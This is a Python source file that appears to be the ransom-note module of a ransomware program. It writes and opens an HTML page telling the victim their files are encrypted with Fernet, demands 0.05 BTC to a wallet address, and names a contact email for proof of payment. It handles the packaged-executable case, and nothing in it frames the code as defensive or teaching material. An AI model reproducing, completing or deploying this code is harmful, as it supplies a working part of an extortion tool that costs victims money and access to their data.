import os
import sys
import logging
import webbrowser

RANSOM_NOTE_FILE = "ransom_note.html"



def generate_ransom_note(session_id):
    try:
        current_dir = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__))
        ransom_note_path = os.path.join(current_dir, RANSOM_NOTE_FILE)
        html = HTML_TEMPLATE.format(session_id=session_id)

        with open(ransom_note_path, "w", encoding="utf-8") as f:
            f.write(html)

        logging.info("Ransom note created with session ID.")
        webbrowser.open(f"file://{ransom_note_path}")
    except Exception as e:
        logging.error(f"Failed to write ransom note: {e}")
        print(f"❌ Failed to write ransom note: {e}")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Your Files Have Been Encrypted</title>
    <style>
    body {{
        background-color: #111;
        color: #e00;
        font-family: 'Courier New', Courier, monospace;
        text-align: center;
        padding: 50px;
    }}
    h1 {{
        font-size: 3em;
        color: #ff3333;
        margin-bottom: 0;
    }}
    .box {{
        background-color: #222;
        border: 2px solid #e00;
        border-radius: 15px;
        padding: 30px;
        margin: auto;
        max-width: 700px;
    }}
    .details {{
        text-align: left;
        margin-top: 20px;
        font-size: 1.1em;
    }}
    .highlight {{
        color: #0f0;
        font-weight: bold;
    }}
    .info {{
        margin-top: 30px;
        color: #0f0;
        font-size: 1em;
        border-top: 1px dashed #555;
        padding-top: 20px;
    }}
</style>
</head>
<body>
    <div class="box">
        <h1>⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️</h1>
        <p>Oops! All your important files are now locked using <span class="highlight">military-grade Fernet encryption</span>.</p>

        <div class="details">
            <p><strong>Session ID:</strong> <span class="highlight">{session_id}</span></p>
            <p><strong>To recover your files:</strong></p>
            <ul>
                <li>Send <span class="highlight">0.05 BTC</span> to the following address:</li>
                <li><code>1j2ij0neigfjn34i23uin9e8dfhv</code></li>
                <li>Email your payment proof and Session ID to: <span class="highlight">aetherking2004@gmail.com</span></li>
            </ul>
        </div>

        <div class="info">
            ✅ If you have already paid and decrypted your files,<br>
            don't worry about the countdown timer.<br>
            <strong>Your files will NOT be deleted.</strong>
        </div>
    </div>
</body>
</html>
"""

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python ransom_note.py <SESSION_ID>")
    else:
        session_id = sys.argv[1]
        generate_ransom_note(session_id)
